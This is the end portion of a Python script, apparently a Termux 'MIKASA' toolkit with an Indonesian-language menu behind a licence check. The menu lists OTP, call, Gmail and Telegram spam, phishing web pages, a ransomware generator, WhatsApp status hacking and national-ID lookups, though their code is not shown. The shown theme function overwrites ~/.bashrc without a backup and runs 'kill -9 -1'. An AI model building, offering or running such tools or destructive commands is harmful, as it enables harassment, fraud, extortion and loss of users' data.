    try:
        pilih = input(f"{U}❯❯❯ {W}Pilih Thema {G}❯{N} ")
        if pilih == "0":
            return
        if pilih not in themes:
            print(f"{W}[ {R}??{W} ] Pilihan tidak valid!{N}")
            time.sleep(1)
            return
    except:
        print(f"{W}[ {R}??{W} ] Masukkan angka!{N}")
        time.sleep(1)
        return
    
    selected = themes[pilih]
    
    def load_bar_theme(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Menerapkan Tema {selected["name"]} [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop = threading.Event()
    t = threading.Thread(target=load_bar_theme, args=(stop,))
    t.daemon = True
    t.start()
    time.sleep(1.5)
    stop.set()
    t.join()
    
    try:
        bashrc_path = os.path.expanduser("~/.bashrc")
        
        bashrc_template = f'''# ── {selected['name']} Theme ──
neofetch --ascii_distro {selected['neofetch']}

BG_BIRU="\\[\\e[48;5;25m\\]"
FG_PUTIH="\\[\\e[38;5;255m\\]"
FG_ABU="\\[\\e[38;5;245m\\]"
FG_UNGU="\\[\\e[38;5;93m\\]"
FG_HIJAU="\\[\\e[38;5;46m\\]"
RESET="\\[\\e[0m\\]"

get_branch_info() {{
    if [[ "$PWD" == *"/Mikasa"* ]]; then
        echo " make run"
    else
        echo " main"
    fi
}}

export PS1="${{BG_BIRU}}${{FG_PUTIH}} \\w ${{RESET}} on ${{FG_UNGU}}[]\\$(get_branch_info)\\n${{FG_HIJAU}}❯${{RESET}} "
'''
        
        with open(bashrc_path, 'w') as f:
            f.write(bashrc_template)

        os.system('clear')
        try:
            subprocess.run(['neofetch', '--ascii_distro', selected['neofetch']], timeout=10)
        except:
            print(f"{W}[ {R}??{W} ] Neofetch tidak terinstall!{N}")
            print(f"{W}Install {R}:{W} pkg install neofetch{N}")
        
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ ketik {G}YES{W} Untuk Memakai dan ketik {R}NO{W} Untuk Tidak Mengganti {N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        
        restart = input(f"{U}❯❯❯ {W}Memakai Thema Termux sekarang? {R}: {N}").lower()
        if restart == 'yes':
            print(f" {W}[ {G}!!{W} ] Restarting Termux...{N}")
            time.sleep(1)
            os.system('kill -9 -1')
            sys.exit(0)
            
    except Exception as e:
        print(f"\n{W}[ {R}??{W} ] Gagal menerapkan tema: {e}{N}")
    
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")

def menu_utama():
    global clock_running, current_input
    
    clock_running = True
    clock_thread = threading.Thread(target=refresh_date, daemon=True)
    clock_thread.start()
    
    tools = {
        "1": tool_otp_spam, "01": tool_otp_spam,
        "2": tool_pairing_spam, "02": tool_pairing_spam,
        "3": tool_spam_call, "03": tool_spam_call,
        "4": tool_spam_report, "04": tool_spam_report,
        "5": tool_spam_NGL, "05": tool_spam_NGL,
        "6": tool_osint, "06": tool_osint,
        "7": tool_musik, "07": tool_musik,
        "8": tool_encryptor, "08": tool_encryptor,
        "9": tool_ip_tracker, "09": tool_ip_tracker,
        "10": tool_port_scanner,
        "11": tool_nik_checker,
        "12": tool_Phissing,
        "13": tool_tiktok_downloader,
        "14": tool_JOIN_Grub,
        "15": tool_qr_generator,
        "16": tool_list_user,
        "17": cek_kode_pos,
        "18": tool_cek_npsn,
        "19": tool_freefire_checker,
        "20": tool_roblox_checker,
        "21": tool_gmail_spam,
        "22": tool_gtk_checker,
        "23": tool_telegram_spam,
        "24": tool_ransomware_generator,
        "25": tool_imei_checker,
        "26": tool_web_phising,
        "27": tool_web_recon,
        "28": lapor_bug,
        "29": tool_tambahan,
        "30": tool_photo_to_url,
        "31": tool_file_to_url,
        "32": tool_bunuh_bot_telegram,
        "33": tool_cek_bot_telegram,
        "34": tool_link_shortener,
        "35": tool_Hack_status_wa,
        "36": tool_cek_resi,
        "37": tool_get_bot_id,
        "38": tool_theme_termux,
    }
    
    try:
        while True:
            current_input = ""
            pilihan = input().strip()
            current_input = pilihan
            
            if pilihan in ["0", "00"]:
                clock_running = False
                print(f"\n{W}[ {R}!!{W} ] Keluar dari MIKASA...{N}")
                time.sleep(1)
                os.system('clear')
                sys.exit(0)
            elif pilihan in tools:
                clock_running = False
                tools[pilihan]()
                clock_running = True
                if not clock_thread.is_alive():
                    clock_thread = threading.Thread(target=refresh_date, daemon=True)
                    clock_thread.start()
            else:
                print(f"\n{W}[ {R}??{W} ] Pilihan tidak valid!{N}")
                time.sleep(1)
                os.system('clear')
                user = get_user()
                date = get_date()
                username = get_username()
                print_banner(user, date, username)

    except KeyboardInterrupt:
        clock_running = False
        print(f"\n\n{R}[!] Keluar...{N}")
        sys.exit(0)

if __name__ == "__main__":
    uid = get_uid()
    status, user = cek_uid(uid)
    if status is None:
        print(f"{R}[!] Gagal terhubung ke server lisensi.{N}")
        time.sleep(3)
        sys.exit(1)
    elif status is False:
        menu_uid()
    elif user.get("status") != "active":
        print(f"{Y}[!] Akun kamu belum diaktivasi admin.{N}")
        time.sleep(3)
        sys.exit(0)
    try:
        menu_utama()
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Keluar...{N}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[!] Error: {e}{N}")
        time.sleep(2)
        sys.exit(1)


